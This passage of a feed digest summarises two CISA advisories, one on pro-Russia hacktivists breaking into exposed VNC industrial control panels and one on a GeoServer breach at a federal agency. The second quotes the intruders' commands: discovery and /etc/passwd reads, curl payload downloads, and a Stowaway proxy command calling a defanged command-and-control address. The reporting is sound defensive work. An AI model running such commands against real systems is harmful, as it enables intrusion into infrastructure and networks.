**Summary:** ‘Extraordinary’ golden lamb’s head pillaged in 1874 from what is now Ghana remains hidden in officers’ mess The Royal Artillery is facing criticism after it emerged they are refusing public access to an “extraordinary object” looted by the British army in the 19th century from the Asante people in modern-day Ghana. The glistening golden ram’s head would seemingly be worthy of any museum, but it remains hidden within the regiment’s mess at Larkhill in Wiltshire. Continue reading...

## 46. Pro-Russia Hacktivists Conduct Opportunistic Attacks Against US and Global Critical Infrastructure
**Link:** https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-343a  
**Published:** Fri, 05 Dec 2025 14:35:38 EST  
**Source:** CISA Cybersecurity Advisories

**Summary:** Summary Note: This joint Cybersecurity Advisory is being published as an addition to the Cybersecurity and Infrastructure Security Agency (CISA) May 6, 2025, joint fact sheet Primary Mitigations to Reduce Cyber Threats to Operational Technology and European Cybercrime Centre’s (EC3) Operation Eastwood , in which CISA, Federal Bureau of Investigation (FBI), Department of Energy (DOE), Environmental Protection Agency (EPA), and EC3 shared information about cyber incidents affecting the operational technology (OT) and industrial control systems (ICS) of critical infrastructure entities in the United States and globally. FBI, CISA, National Security Agency (NSA), and the following partners—hereafter referred to as “the authoring organizations”—are releasing this joint advisory on the targeting of critical infrastructure by pro-Russia hacktivists: U.S. Department of Energy (DOE) U.S. Environmental Protection Agency (EPA) U.S. Department of Defense Cyber Crime Center (DC3) Europol European Cybercrime Centre (EC3) EUROJUST – European Union Agency for Criminal Justice Cooperation Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC) Canadian Centre for Cyber Security (Cyber Centre) Canadian Security Intelligence Service (CSIS) Czech Republic Military Intelligence (VZ) Czech Republic National Cyber and Information Security Agency (NÚKIB) Czech Republic National Centre Against Terrorism, Extremism, and Cyber Crime (NCTEKK) French National Cybercrime Unit – Gendarmerie Nationale (UNC) French National Jurisdiction for the Fight Against Organized Crime (JUNALCO) German Federal Office for Information Security (BSI) Italian State Police (PS) Latvian State Police (VP) Lithuanian Criminal Police Bureau (LKPB) New Zealand National Cyber Security Centre (NCSC-NZ) Romanian National Police (PR) Spanish Civil Guard (GC) Spanish National Police (CNP) Swedish Polisen (SC3) United Kingdom National Cyber Security Centre (NCSC-UK) The authoring organizations assess pro-Russia hacktivist groups are conducting less sophisticated, lower-impact attacks against critical infrastructure entities, compared to advanced persistent threat (APT) groups. These attacks use minimally secured, internet-facing virtual network computing (VNC) connections to infiltrate (or gain access to) OT control devices within critical infrastructure systems. Pro-Russia hacktivist groups—Cyber Army of Russia Reborn (CARR), Z-Pentest, NoName057(16), Sector16, and affiliated groups—are capitalizing on the widespread prevalence of accessible VNC devices to execute attacks against critical infrastructure entities, resulting in varying degrees of impact, including physical damage. Targeted sectors include Water and Wastewater Systems , Food and Agriculture , and Energy . The authoring organizations encourage critical infrastructure organizations to implement the recommendations in the Mitigations section of this advisory to reduce the likelihood and impact of pro-Russia hacktivist-related incidents. For additional information on Russian state-sponsored malicious cyber activity, see CISA’s Russia Threat Overview and Advisories webpage. Download the PDF version of this report: Pro-Russia Hacktivists Conduct Opportunistic Attacks Against US and Global Critical Infrastructure (PDF, 1.53 MB ) Background and Development of Pro-Russia Hacktivist Groups Over the past several years, the authoring organizations have observed pro-Russia hacktivist groups conducting cyber operations against numerous organizations and critical infrastructure sectors worldwide. The escalation of the Russia-Ukraine conflict in 2022 significantly increased the number of these pro-Russia groups. Consisting of individuals who support Russia’s agenda but lack direct governmental ties, most of these groups target Ukrainian and allied infrastructure. However, among the increasing number of groups, some appear to have associations with the Russian state through direct or indirect support. Cyber Army of Russia Reborn The authoring organizations assess that the Russian General Staff Main Intelligence Directorate (GRU) Main Center for Special Technologies (GTsST) military unit 74455—tracked in the cybersecurity community under several names (see Appendix B: Additional Designators Used for Cited Groups )—is likely responsible for supporting the creation of CARR —also known as “The People’s Cyber Army of Russia”—in late February or early March of 2022. Actors suspected to be from GRU unit 74455 likely funded the tools CARR threat actors used to conduct distributed denial-of-service (DDoS) attacks through at least September 2024. In April 2022, the group began using a new Telegram channel featuring the name “CyberArmyofRussia_Reborn” to organize and plan group actions. The channel creators recruited actors to use CARR as an unattributable platform for conducting cyber activities beneath the level of an APT, aimed at deterring anti-Russia rhetoric. CARR threat actors presented themselves as a group of pro-Russia hacktivists supporting Russia’s stance on the Ukrainian conflict, and they soon began claiming responsibility for DDoS attacks against the U.S. and Europe for supporting Ukraine. CARR documented these actions through embellished images and videos shared on their social media channels, promoting Russian ideology, disseminating talking points, and publicizing leaked information from hacks attributed to Russian state threat actors. In late 2023, CARR expanded their operations to include attacks on industrial control systems (ICS), claiming an intrusion against a European wastewater treatment facility in October 2023. In November 2023, CARR targeted human-machine interface (HMI) devices, claiming intrusions at two U.S. dairy farms. The authoring organizations assess that by late September 2024, CARR channel administrators became dissatisfied with the level of support and funding provided by the GRU. This dissatisfaction led CARR administrators and an administrator from another hacktivist group, NoName057(16), to create the Z-Pentest group, employing the same tactics, techniques, and procedures (TTPs) as CARR but separate from GRU involvement. NoName057(16) The authoring organizations assess that the Center for the Study and Network Monitoring of the Youth Environment (CISM), established on behalf of the Kremlin, created NoName057(16) as a covert project within the organization. Senior executives and employees within CISM developed and customized the NoName057(16) proprietary DDoS tool DDoSia , paid for the group’s network infrastructure, served as administrators on NoName057(16) Telegram channels, and selected DDoS targets. Active since March 2022, NoName057(16) has conducted frequent DDoS attacks against government and private sector entities in North Atlantic Treaty Organization (NATO) member states and other European countries perceived as hostile to Russian geopolitical interests. The group operates primarily through Telegram channels and used GitHub, alongside various websites and repositories, to host DDoSia and share materials and TTPs with their followers.&nbsp; In 2024, NoName057(16) began collaborating closely with other pro-Russia hacktivist groups, operating a joint chat with CARR by mid-2024. In July 2024, NoName057(16) jointly claimed responsibility with CARR for an alleged intrusion against OT assets in the U.S. The high degree of cooperation with CARR likely contributed to the formation of Z-Pentest, which is composed of actors and administrators from both teams, in September 2024. Z-Pentest Established in September 2024, Z-Pentest is composed of members from CARR and NoName057(16). The group specializes in OT intrusion operations targeting globally dispersed critical infrastructure entities. Additionally, the group uses “hack and leak” operations and defacement attacks to draw attention to their pro-Russia messaging. Unlike other pro-Russia hacktivist groups, Z-Pentest largely avoids DDoS activities, claiming OT intrusions as attempts to garner more attention from the media. Shortly after Z-Pentest’s inception, the group announced alliances with CARR and NoName057(16), possibly to leverage the other groups’ subscribers to grow the new channel. In March 2025, Z-Pentest posted evidence claiming OT device intrusions to their channel using a NoName057(16) cyberattack campaign hashtag. Similarly, in April 2025, Z-Pentest shared a video purporting defacement of an HMI by changing system names to NoName057(16) and CARR references. Z-Pentest continues to create new alliances with other groups, like Sector16, to continue growing their subscriber base and incidentally propagate TTPs with new partners. Sector16 Formed in January 2025, Sector16 is a novice pro-Russia hacktivist group that emerged through collaboration with Z-Pentest. Sector16 actively maintains an online presence, including a public Telegram channel where they share videos, statements, and claims of compromising U.S. energy infrastructure. These communications often align with pro-Russia narratives and reflect their self-proclaimed support for Russian geopolitical objectives. Members of Sector16 may have received indirect support from the Russian government in exchange for conducting specific cyber operations that further Russian strategic goals. This aligns with broader Russian cyber strategies that involve leveraging non-state threat actors for certain cyber activities, adding a layer of deniability. Technical Details Note: This advisory uses the MITRE ATT&amp;CK ® Matrix for Enterprise framework , version 18.&nbsp;See the MITRE ATT&amp;CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques. TTP Overview Pro-Russia hacktivist groups employ easily disseminated and replicated TTPs across various entities, increasing the likelihood of widespread adoption and escalating the frequency of intrusions. These groups have limited capabilities, frequently misunderstanding the processes they aim to disrupt. Their apparent low level of technical knowledge results in haphazard attacks where actors intend to cause physical damage but cannot accurately anticipate actual impact. Despite these limitations, the authoring organizations have observed these groups willfully cause actual harm to vulnerable critical infrastructure. Pro-Russia hacktivist groups use the TTPs in this Cybersecurity Advisory to target virtual network computing (VNC)-connected HMI devices. These groups are primarily seeking notoriety with their actions. While they have caused damage in some instances, they regularly make false or exaggerated claims about their attacks on critical infrastructure to garner more attention. They frequently misrepresent their capabilities and the impacts of their actions, portraying minor incursions as significant breaches, but such incursions can still lead to lost time and resources for operators remediating systems. Additionally, pro-Russia hacktivists use an opportunistic targeting methodology. They leverage superficial criteria, such as victim availability and existing vulnerabilities, rather than focusing on strategically significant entities. Their lack of strategic focus can lead to a broad array of targets, ranging from water treatment facilities to oil well systems. Pro-Russia hacktivists have demonstrated a pattern of frequently taking advantage of the widespread availability of vulnerable VNC connections. While system owners typically use VNC connections for legitimate remote system access functions, threat actors can maliciously use these connections to broadly target numerous platforms and services. Consequently, these groups can indiscriminately compromise critical infrastructure entities, including those in the Water and Wastewater , Food and Agriculture , and Energy Sectors. Pro-Russia hacktivist groups have successfully targeted supervisory control and data acquisition (SCADA) networks using basic methods, and in some cases, performed simultaneous DDoS attacks against targeted networks to facilitate SCADA intrusions. As recently as April 2025, threat actors used the following unsophisticated TTPs to access networks and conduct SCADA intrusions: Scan for vulnerable devices on the internet [ T0883 ] with open VNC ports [ T1595.002 ]. Initiate temporary virtual private server (VPS) [ T1583.003 ] to execute password brute force software. Use VNC software to access hosts [ T1021.005 ]. Confirm connection to the vulnerable device [ T0886 ]. Brute force the password, if required [ T1110.003 ]. Gain access to HMI devices [ T0883 ], typically with default [ T0812 ], weak, or no passwords [ T0859 ]. Log the confirmed vulnerable device IP address, port, and password. Using the HMI graphical interface [ T0823 ], capture screen recordings or intermittent screenshots while conducting the following actions, intending to affect productivity and cause additional costs [ T0828 ]: Modify usernames/passwords [ T0892 ]; Modify parameters [ T0836 ]; Modify device name [ T0892 ]; Modify instrument settings [ T0831 ]; Disable alarms [ T0878 ]; Create loss of view (a technique that mandates local hands-on operator intervention) [ T0829 ]; and/or Device restart or shutdown [ T0816 ]. Disconnect from the device, ending the VNC connection. Research the compromised device company after the intrusion [ T1591 ]. Propagation To reach a wider audience, pro-Russia hacktivist groups work together, amplify each other’s posts, create additional groups to amplify their own posts, and likely share TTPs. For example, Z-Pentest jointly claimed intrusion of a U.S. system with Sector16. Sector16 later began posting additional intrusions for which the group claimed sole responsibility. It is likely that these and similar groups will continue to iterate and share these methods to disrupt critical infrastructure organizations. Reconnaissance and Initial Access The threat actors’ intrusion methodology is relatively unsophisticated, inexpensive to execute, and easy to replicate. These pro-Russia hacktivist groups abuse popular internet-scraping tools, such as Nmap or OPENVAS , to search for visible VNC services and use brute force password spraying tools to access devices via known default or otherwise weak credentials. Threat actors typically search for these services on the default port 5900 or other nearby ports ( 5901-5910 ). Their goal is to gain remote access to HMI devices connected to live control networks. Once threat actors obtain access, they manipulate available settings from the graphical user interface (GUI) on the HMI devices, such as arbitrary physical parameter and setpoint changes, or conduct defacement activities. Because pro-Russia hacktivist groups seem to lack sector-specific expertise or cyber-physical engineering knowledge, they currently cannot reliably estimate the true impact of their actions. Regardless of outcome, pro-Russia hacktivist groups often post images and screen recordings to their social media platforms, boasting the compromises and exaggerating impacts to garner attention from their peers and the media. Impact While pro-Russia hacktivist groups currently demonstrate limited ability to consistently cause significant impact, there is a risk that their continued attacks will result in further harm or grievous physical consequences. Attacks have not yet caused injury; however, the attacks against occupied factories and community facilities demonstrate a lack of consideration for human safety. Victim organizations reported that the most common operational impact caused by these threat actors is a temporary loss of view, necessitating manual intervention to manage processes. However, any modifications to programmatic and systematic procedures can result in damage or disruption, including substantial labor costs from hiring a programmable logic controller programmer to restore operations, costs associated with operational downtime, and potential costs for network remediation. MITRE ATT&amp;CK Tactics and Techniques See Table 1 to Table 10 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s Best Practices for MITRE ATT&amp;CK Mapping and CISA’s Decider Tool . Table 1. Reconnaissance Technique Title ID Use Gather Victim Organization Information T1591 Threat actors use information available on the internet to determine what systems they believe they have compromised and post the information on their social media. This methodology frequently leads to the threat actors misidentifying their claimed victims. Active Scanning: Vulnerability Scanning T1595.002 Threat actors use open source tools to look for IP addresses in target countries with visible VNC services on common ports. Table 2.

Inhibit Response Function Technique Title ID Use Device Restart/Shutdown T0816 While threat actors claim to turn off HMIs, it is possible that operators (not the threat actors) turn the devices off during incident response. Alarm Suppression T0878 Threat actors use HMI interfaces to clear alarms caused by their activity and alarms already present on the system at the time of their intrusion. Change Credential T0892 Threat actors change the usernames and passwords of HMI devices in operator lockout attempts, usually resulting in a loss of view and operators switching to manual operations. Table 9. Impair Process Control Technique Title ID Use Modify Parameter T0836 Threat actors attempt to change upper and lower limits of operational devices as available from the HMI. Unauthorized Command Message T0855 Threat actors attempt to send unauthorized command messages to instruct control system assets to perform actions outside of their intended functionality, causing possible impact. Table 10. Impact Technique Title ID Use Loss of Productivity and Revenue T0828 Threat actors purposefully attempt to impact productivity and create additional costs for the affected entities. Loss of View T0829 Threat actors change credentials on HMI devices, preventing operators from modifying processes remotely.&nbsp; Manipulation of Control T0831 Threat actors change setpoints in processes, impacting the efficiency of operations for those specific processes. &nbsp; Incident Response If organizations find exposed systems with weak or default passwords, they should assume threat actors compromised the system and begin the following incident response protocols: Determine which hosts were compromised and isolate them by quarantining or taking them offline. Initiate threat hunting activities to scope the intrusion . Collect and review artifacts, such as running processes/services, unusual authentications, and recent network connections. Reimage compromised hosts . Provision new account credentials . Report the compromise to CISA, FBI, and/or NSA . See the Contact Information section of this advisory. Harden the network to prevent additional malicious activity . See the Mitigations section of this advisory for guidance. Mitigations OT Asset Owners and Operators The authoring organizations recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture based on the threat actors’ activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s CPGs webpage for more information on the CPGs, including additional recommended baseline protections. Reduce exposure of OT assets to the public-facing internet. When connected to the internet, OT devices are easy targets for malicious cyber threat actors. Many devices can be found by searching for open ports on public IP ranges with search engine tools to target victims with OT components [ CPG 3.S ]. Asset owners should use attack surface management services&nbsp; and web-based search platforms to scan the internet. This mitigation can help identify if there are VNC systems exposed within the IP ranges they own, especially for connections set up by third parties. Note: For more information on attack surface management, see CISA’s Internet Exposure Reduction Guidance , CISA’s Cyber Hygiene Services for U.S. critical infrastructure, and NSA’s Attack Surface Management for the U.S. Defense Industrial Base. Implement network segmentation between IT and OT networks. Segmenting critical systems and introducing a demilitarized zone (DMZ) for passing control data to enterprise logistics reduces the potential impact of cyber threats and the risk of disruptions to essential OT operations [ CPG 3.I ]. Consider implementing a firewall and/or virtual private network if exposure to the internet is necessary for controlling access to devices. Consider disabling public exposure by default and implementing time-limited remote access to reduce the amount of time systems are exposed. Restrict and monitor both inbound and outbound traffic at OT perimeter firewalls. Configure OT perimeter firewalls to enforce a default-deny policy for all traffic. Asset owners should explicitly permit authorized destinations and protocols based on operational requirements. Implement strict egress filtering to prevent unauthorized data exfiltration or command-and-control callbacks. Regularly audit firewall rulesets and monitor outbound traffic patterns for anomalies indicative of threat actor activity, such as beaconing or unexpected protocol usage. Adopt mature asset management processes , including mapping data flows and access points. Generating a complete picture of both OT and IT assets provides visibility to operators and management, allowing organizations to monitor and assess deviations for criticality [ CPG 2.A ]. Keep remote access services updated&nbsp; with the latest version available and ensure all systems and software are up to date with patches and necessary security updates. Keep VNC systems updated with the latest version available. Refer to the joint&nbsp; Foundations for OT Cybersecurity: Asset Inventory Guidance for Owners and Operators to help with reducing cybersecurity risk by identifying which assets within their environment should be secured and protected. Ensure OT assets use robust authentication procedures. Many devices lack robust authentication and authorization. Devices with weak authentication are vulnerable targets to threat actors using credential theft techniques. Implement MFA where possible. Where MFA is not feasible, use strong, unique passwords. Apply password standards for operator-accessible services on underlying OT assets, as well as network devices protecting those services. This is especially important for services that require internet accessibility [ CPG 3.A ] [ CPG 3.B ] [ CPG 3.C ] [ CPG 3.F ]. Establish an allowlist that permits only authorized device IP addresses and/or media access control addresses. The allowlist can be refined to operator working hours to further obstruct malicious threat actor activity; organizations are encouraged to establish monitoring and alerting for access attempts not meeting these criteria [ CPG 3.E ]. Disable any unused authentication methods, logic, or features, such as default authentication keys and default passwords. Block all unused high ephemeral ports and monitor for attempted connections using standard protocols on non-standard ports [ CPG 3.R ]. Authenticate all access to field controllers before authorizing access to, or modification of, a device’s state, logic, program, or filesystems. Enable control system security features&nbsp; that can separate and audit view and control functions. Limiting remotely accessible or default user accounts to “view-only” removes the potential for impact without exploiting a vulnerability [ CPG 3.G ]. Implement and practice business recovery/disaster recovery plans. Plans should also take into consideration redundancy, fail-safe mechanisms, islanding capabilities, backup restoration, and manual operation. Include scenarios that necessitate switching to manual operations. Maintaining the capability of an organization to revert to manual controls to quickly restore operations is vital in the immediate aftermath of a cyber incident [ CPG 6.A ]. Create backups of the engineering logic, configurations, and firmware of HMIs to enable fast recovery. Organizations should routinely test backups and standby systems to ensure safe manual operations in the event of an incident [ CPG 3.O ]. Collect and monitor the traffic of OT assets and networking devices. This includes unusual logins or unexpected protocols communicating over the internet, and functions of ICS management protocols that change an asset’s operating mode or modify programs. Review configurations for setpoint ranges or tag values&nbsp; to stay within safe ranges and establish alerting for deviations. Take a proactive approach in the procurement process by following the guidance outlined in the joint guide Secure by Demand: Priority Considerations for Operational Technology Owners and Operators when Selecting Digital Products . OT Device Manufacturers Although critical infrastructure organizations can take steps to mitigate risks, it is ultimately the responsibility of OT device manufacturers to build products that are secure by design. The authoring organizations urge device manufacturers to take ownership of the security outcomes of their customers in line with the joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software . Eliminate default credentials and require strong passwords. The use of default credentials is a top weakness threat actors exploit to gain access to systems. Mandate MFA for privileged users. Changes to engineering logic or configurations are safety-impacting events in critical infrastructure. MFA should be available for safety critical components at no additional cost. Practice secure by default principles.&nbsp; OT components were initially designed without public internet connectivity in mind. When internet connection becomes necessary, implementing additional security measures is essential to safeguard these systems. Manufacturers should recognize insecure states and promptly inform users so they can make informed risk decisions. Include logging at no additional charge. Change and access control logs allow operators to track safety-impacting events in their critical infrastructure. These logs should be available for no cost and use open standard logging formats. Publish Software Bill of Materials (SBOMs). Vulnerabilities in underlying software libraries can affect a wide range of devices. Without an SBOM, it is nearly impossible for a critical infrastructure system owner to measure and mitigate the impact of a vulnerability on their existing systems. See CISA’s SBOM webpage for more information. Additionally, see CISA’s Secure by Design Alert on how software manufacturers can shield web management interfaces from malicious cyber activity. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing tiered security software and logs, monitoring, and making routine updates. For more information on secure by design, see CISA’s Secure by Design webpage. Validate Security Controls In addition to applying mitigations, the authoring organizations recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK Matrix for Enterprise framework in this advisory. The authoring organizations recommend testing your existing security controls inventory to assess how it performs against the ATT&amp;CK techniques described in this advisory. To start: Select an ATT&amp;CK technique described in this advisory (see Table 1 to Table 10 ). Align your security technologies against the technique. Test your technologies against the technique. Analyze your detection and prevention technologies’ performance. Repeat the process for all security technologies to obtain a set of comprehensive performance data. Tune your security program, including people, processes, and technologies, based on the data generated by this process. The authoring organizations recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.

**Summary:** Advisory at a Glance Executive Summary CISA began incident response efforts at a U.S. federal civilian executive branch (FCEB) agency following the detection of potential malicious activity identified through security alerts generated by the agency’s endpoint detection and response (EDR) tool. CISA identified three lessons learned from the engagement that illuminate how to effectively mitigate risk, prepare for, and respond to incidents: vulnerabilities were not promptly remediated, the agency did not test or exercise their incident response plan (IRP), and EDR alerts were not continuously reviewed. Key Actions Prevent compromise by prioritizing the patching of critical vulnerabilities in public-facing systems and known exploited vulnerabilities. Prepare for incidents by maintaining, practicing, and updating incident response plans. Prepare for incidents by implementing comprehensive and verbose logging and aggregate logs in a centralized out-of-band location. Indicators of Compromise&nbsp; For a downloadable copy of indicators of compromise, see:&nbsp; AA25-266A-JSON.stix_.json AA25-266A-STIX.stix_.xml Intended Audience Organizations: FCEB agencies and critical infrastructure organizations. Roles: Defensive Cybersecurity Analysts , Vulnerability Analysts , Security Systems Managers , Systems Security Analysts , and Cybersecurity Policy and Planning Professionals . Download the PDF version of this report AA25-266A advisory cisa shares lessons learned from ir engagement Introduction The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this Cybersecurity Advisory to highlight lessons learned from an incident response engagement CISA conducted at a U.S. federal civilian executive branch (FCEB) agency. CISA is publicizing this advisory to reinforce the importance of prompt patching, as well as preparing for incidents by practicing incident response plans and by implementing logging and aggregating logs in a centralized out-of-band location. CISA is also raising awareness about the tactics, techniques, and procedures (TTPs) employed by these cyber threat actors to help organizations safeguard against similar exploits. CISA began incident response efforts at an FCEB agency after the agency identified potential malicious activity through security alerts generated by the agency’s endpoint detection and response (EDR) tool. CISA discovered cyber threat actors compromised the agency by exploiting CVE-2024-36401 in a GeoServer about three weeks prior to the EDR alerts. Over the three-week period, the cyber threat actors gained separate initial access to a second GeoServer via the same vulnerability and moved laterally to two other servers. Leveraging insights CISA gleaned from the organization’s security posture and response, CISA is sharing lessons learned for organizations to mitigate similar compromises (see Lessons Learned for more details): Vulnerabilities were not promptly remediated. The cyber threat actors exploited CVE-2024-36401 for initial access on two GeoServers. The vulnerability was disclosed 11 days prior to the cyber threat actors accessing the first GeoServer and 25 days prior to them accessing the second GeoServer. The agency did not test or exercise their incident response plan (IRP), nor did their IRP enable them to promptly engage third parties and grant third parties access to necessary resources. This delayed&nbsp;certain elements of CISA’s response as the IRP did not have procedures for involving third-party assistance or for granting third-party access to their security tools. EDR alerts were not continuously reviewed, and some public-facing systems lacked endpoint protection. The activity remained undetected for three weeks; the agency missed an opportunity to detect this activity earlier as they did not observe an alert from a GeoServer and the Web Server did not have endpoint protection. These lessons highlight strategies to effectively mitigate risk, enhance preparedness, and respond to incidents with greater efficiency. CISA encourages all organizations to consider the lessons learned and apply the associated recommendations in the Mitigations section of this advisory to improve their security posture. This advisory also provides the cyber threat actors’ TTPs and indicators of compromise (IOCs). For a downloadable copy of IOCs, see: AA25-266A-JSON.stix_.json AA25-266A-STIX.stix_.xml Technical Details Note: This advisory uses the MITRE ATT&amp;CK ® Matrix for Enterprise framework, version 17. See the MITRE ATT&amp;CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques. Threat Actor Activity CISA responded to a suspected compromise of a large FCEB agency after the agency’s security operations center (SOC) observed multiple endpoint security alerts. During the incident response, CISA discovered that cyber threat actors gained access to the agency’s network on July 11, 2024, by exploiting GeoServer vulnerability CVE 2024-36401 [ CWE-95: “Eval Injection” ] on a public-facing GeoServer (GeoServer 1). This critical vulnerability, disclosed June 30, 2024, allows unauthenticated users to gain remote code execution (RCE) on affected GeoServer versions [1] . The cyber threat actors used this vulnerability to download open source tools and scripts and establish persistence in the agency’s network. (CISA added this vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog on July 15, 2024.) After gaining initial access to GeoServer 1, the cyber threat actors gained separate initial access to a second GeoServer (GeoServer 2) on July 24, 2024, by exploiting the same vulnerability. They moved laterally from GeoServer 1 to a web server (Web Server) and then a Structured Query Language (SQL) server. On each server, they uploaded (or attempted to upload) web shells such as China Chopper , along with scripts designed for remote access, persistence, command execution, and privilege escalation. The cyber threat actors also used living off the land (LOTL) techniques. See Figure 1 for an overview of the cyber threat actors’ activity and the following sections for detailed threat actors TTPs. Figure&nbsp;1. Overview of Threat Actor Activity Reconnaissance The cyber threat actors identified CVE-2024-36401 in the organization’s public-facing GeoServer using Burp Suite Burp Scanner [ T1595.002 ]. CISA detected this scanning activity by analyzing web logs and identifying signatures associated with the tool. Specifically, CISA observed domains linked to Burp Collaborator—a component of Burp Suite used for vulnerability detection—originating from the same IP address the cyber threat actors later used to exploit the GeoServer vulnerability for initial access. Resource Development The cyber threat actors used publicly available tools to conduct their malicious operations. In one instance, they gained remote access to the organization’s network and leveraged a commercially available virtual private server (VPS) from a cloud infrastructure provider [ T1583.003 ]. Initial Access To gain initial access to GeoServer 1 and GeoServer 2, the cyber threat actors exploited CVE 2024-36401 [ T1190 ]. They leveraged this vulnerability to gain RCE by performing “eval injection,” a type of code injection that allows an untrusted user’s input to be evaluated as code. The cyber threat actors likely attempted to load a JavaScript extension to gain webserver information as an Apache wicket on GeoServer 1. However, their efforts were likely unsuccessful, as CISA observed attempts to access the .js file returning 404 responses in the web logs, indicating that the server could not find the requested URL. Persistence The cyber threat actors primarily used web shells [ T1505.003 ] on internet-facing hosts, along with cron jobs (scheduled commands that run automatically at specified times) [ T1053.003 ], and valid accounts [ T1078 ] for persistence. CISA also identified the creation of accounts—although these accounts were later deleted—with no evidence indicating further use. Privilege Escalation The cyber threat actors attempted to escalate privileges with the publicly available dirtycow tool [2] , which can be used to exploit CVE-2016-5195 [ CWE-362: “Race Condition” ] [ T1068 ]. After compromising web service accounts, they escalated their local privileges to transition away from these service accounts (it is unknown how they escalated privileges). Note: CVE-2016-5195 affects Linux kernel 2.x through 4.x before 4.8.3 and allows users to escalate privileges. CISA added this CVE to its KEV Catalog on March 3, 2022. Defense Evasion To evade detection, the cyber threat actors employed indirect command execution via .php web shells and xp_cmdshell [ T1202 ] and abused Background Intelligence Transfer Service (BITS) jobs [ T1197 ]. CISA also observed files on GeoServer 1 named RinqQ.exe and RingQ.rar , which likely refer to a publicly available defense evasion tool called RingQ [3] , that the cyber threat actors staged for potential use. Note: CISA could not recover most of the files on the host to confirm their contents. Credential Access Once inside the organization’s network, the cyber threat actors primarily relied on brute force techniques [ T1110 ] to obtain passwords for lateral movement and privilege escalation. They also accessed service accounts by exploiting their associated services. Discovery After gaining initial access, the cyber threat actors conducted discovery to facilitate lateral movement. They performed ping sweeps of hosts within specific subnets [ T1018 ] and downloaded the fscan tool [4] to scan the organization’s network. CISA identified the use of the fscan tool by analyzing evidence of its output found on disk. ( Note:&nbsp; fscan is publicly available on GitHub and is capable of port scanning, fingerprinting, and web vulnerability detection—among other functions.) Between July 15 and 31, 2024, the cyber threat actors conducted extensive network and vulnerability scanning using fscan and linux-exploit-suggester2.pl. CISA’s host forensics analysts uncovered this activity by reviewing remnants the cyber threat actors left on disk. GeoServer 1 The cyber threat actors leveraged CVE-2024-36401 to execute the following host discovery commands on GeoServer 1: uname-a df-h env ps -aux ipconfig [ T1016 ] date who -b rpm -qa polkit netstat -ano [ T1049 ] Additionally, they employed LOTL techniques for user, service, filesystem, and network discovery on GeoServer 1: cat /etc/passwd [ T1087.001 ] cat /etc/resolv.conf cat /usr/local/apache-tomcat-9.0.89/webapps/geoserver/WEB-INF/web.xml cat /etc/redhat-release [ T1082 ] cat /etc/os-release&nbsp; The cyber threat actors then used curl commands to download a shell script named mm.sh (which they renamed to aa.sh ) and a zip file named aaa.zip to the /tmp/ directory. Subsequently, they enumerated the internal network from GeoServer 1, identifying Secure Shell (SSH) listeners, File Transfer Protocol (FTP) servers, file servers, and web servers [ T1046 ] by using the fscan tool. ( Note: CISA observed endpoint logs that showed the cyber threat actors uploaded fscan to the compromised host and ran it against internal systems.) The actors then attempted to brute force login credentials for the exploited web services to gain remote access, achieve RCE, or move laterally. The cyber threat actors also conducted ping sweeps of several hosts within the organization’s internal subnets using fscan . Their use of the -nobr and -nopoc flags for fscan indicated that this scan excluded brute forcing or vulnerability scanning, respectively. SQL Server CISA observed the following discovery commands on the organization’s SQL server: whoami [ T1033 ] ipconfig /all ping -n 1 8.8.8.8 systeminfo tasklist [ T1057 ] dir c:\ [ T1083 ] dir c:\Users type c:\Last.txt type c:\inetpub\wwwroot type c:\inetpub\ dir c:\inetpub\wwwroot dir c:\ dir c:\ifwapps dir d:\ dir e:\ net group "domain admins" /domain type C:\Windows\System32\inetsrv\config\applicationHost.config dir c:\ifwapps\Tier1Utilities netstat -ano curl net user tasklist GeoServer 2 Based on images CISA received of GeoServer 2, CISA observed the bash history of a user that showed the use of Burp Collaborator to execute encoded host and network discovery commands. Lateral Movement In one instance, the cyber threat actors moved laterally from the Web Server to the SQL Server by enabling xp_cmdshell for RCE on GeoServer 1. Command and Control The cyber threat actors used PowerShell [ T1059.001 ] and bitsadmin getfile to download payloads [ T1105 ].&nbsp; They used Stowaway [5] , a publicly available multi-level proxy tool, to establish C2 [ T1090 ]. Stowaway enabled the cyber threat actors to bypass the organization’s intranet restrictions and access internal network resources by forwarding traffic from their C2 server through the Web Server. They wrote Stowaway to disk using a tomcat service account. The actors then executed Stowaway via /var/tmp/agent -c 45.32.22[.]62:4441 -s f86bc7ff68aff3ad –up http –reconnect 10 . To test their level of access, the cyber threat actors performed a ping sweep of multiple hosts in a particular subnet of the organization’s network. Next, the cyber threat actors downloaded a modified version of Stowaway using a curl command, successfully establishing an outbound connection with their C2 server using HTTP over TCP/4441 . On July 14, 2024, the cyber threat actors executed /tmp/mm.sh on the Web Server followed by an encoded command to execute Stowaway. The contents of this file could not be recovered. Additionally, they used Stowaway to establish a second C2 connection over TCP/50012 , likely serving as a backup C2 channel. CISA discovered evidence of various files hosted on the C2 server, including numerous publicly available tools and scripts: RingQ antivirus defense evasion tool ( RingQ.exe , RingQ.rar ) IOX proxy tool ( iox.rar ) BusyBox trojan multi-tool ( busybox ) WinRAR archive tool ( Rar.exe ) Stowaway proxy tool ( agent , agent.tar , agent.zip , agentu.exe ) Web shells ( Handx.ashx , start_tomcat.jsp ) Various shell scripts ( mm.sh , t.py , t1.sh , c.bat ) Detection The cyber threat actors remained undetected in the organization’s environment for three weeks before the organization’s SOC identified the compromise 